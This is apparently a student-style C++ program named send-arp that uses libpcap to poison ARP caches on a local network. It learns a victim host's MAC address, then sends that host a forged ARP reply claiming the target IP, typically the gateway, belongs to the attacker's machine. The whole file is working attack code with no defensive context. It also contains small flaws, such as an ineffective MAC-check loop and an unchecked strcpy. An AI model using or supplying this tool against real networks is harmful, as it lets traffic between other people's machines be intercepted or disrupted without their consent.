#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void make_packet(EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, uint32_t sip, Mac tm, uint32_t tip, int request) {
	packet->eth_.dmac_ = dmac;
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(request) packet->arp_.op_ = htons(ArpHdr::Request);
	else packet->arp_.op_ = htons(ArpHdr::Reply);
	packet->arp_.smac_ = sm;
	packet->arp_.sip_ = htonl(Ip(sip));
	packet->arp_.tmac_ = tm;
	packet->arp_.tip_ = htonl(Ip(tip));
}

bool send_packet(pcap_t* handle, EthArpPacket* packet) {
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 0;
	}
	return 1;
}

bool wait_packet(pcap_t* handle, Mac* sm, uint32_t sip, Mac tm, uint32_t tip) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	while(1) {
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
		
		EthArpPacket* catched_packet = (EthArpPacket*)packet;
		
		if(ntohs(catched_packet->arp_.op_) != ArpHdr::Reply) continue;
		if(ntohl(catched_packet->arp_.sip_) != sip) continue;	
		if(ntohl(catched_packet->arp_.tip_) != tip) continue;
		for(int i=0; i<6; i++) if(((uint8_t*)(catched_packet->arp_.tmac_))[i] != ((uint8_t*)tm)[i]) continue;
		*sm = Mac(catched_packet->arp_.smac_); 
		break;
	}
	return 1;
}

bool get_dest_mac(pcap_t* handle, EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, uint32_t sip, Mac tm, uint32_t tip, Mac* dest_mac, int request) {
	
	make_packet(packet, dmac, smac, sm, sip, tm, tip, request);
	if(send_packet(handle, packet) == 0) {
		printf("error: while seding packet\n");
		return 0;
	}
	if(wait_packet(handle, dest_mac, tip, sm, sip) == 0)  {
		printf("error: while receving packet\n");
		return 0;
	}
	return 1;
}

void print_MAC(Mac target_mac) {
	printf("%02X:%02X:%02X:%02X:%02X:%02X\n", ((uint8_t*)target_mac)[0], ((uint8_t*)target_mac)[1], ((uint8_t*)target_mac)[2], ((uint8_t*)target_mac)[3], ((uint8_t*)target_mac)[4], ((uint8_t*)target_mac)[5]);
}


//Reference : https://pencil1031.tistory.com/66

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>

int getIPAddress(uint32_t *ip_addr, char* dev) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	*ip_addr = htonl(sin->sin_addr.s_addr);
	close(sock);
	return 1;
}

int getMacAddress(uint8_t *mac, char* dev) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};		
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	strcpy(ifr.ifr_name, dev);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	for(int i=0; i<6; i++) {
		mac[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc == 2 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	
	uint8_t mac[6] = { 0,};
	uint32_t my_ip;
	Mac my_mac;
	
	getIPAddress(&my_ip, dev);
	getMacAddress(mac, dev);
	
	my_mac = Mac(mac);
	
	Mac target_mac;
	Mac sender_mac;
	uint32_t sender_ip;
	uint32_t target_ip;
	
	for(int i=2; i<argc; i+=2) {
		sender_ip = Ip((argv[i]));
		target_ip = Ip((argv[i + 1]));
		
		printf("\nSENDER IP : %s\tTARGET IP : %s\n\n", argv[i], argv[i+1]);
		
		printf("FIND SENDER MAC\n");
		if(get_dest_mac(handle ,&packet, Mac("FF:FF:FF:FF:FF:FF"), my_mac, my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip, &sender_mac, 1) == 0) return 0;
		printf("SENDER MAC : ");
		print_MAC(sender_mac);
		
		printf("SEND ARP REPLY PACKET\n");
		make_packet(&packet, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip, 0);
		send_packet(handle, &packet);
		printf("DONE\n");
	}
	pcap_close(handle);

}
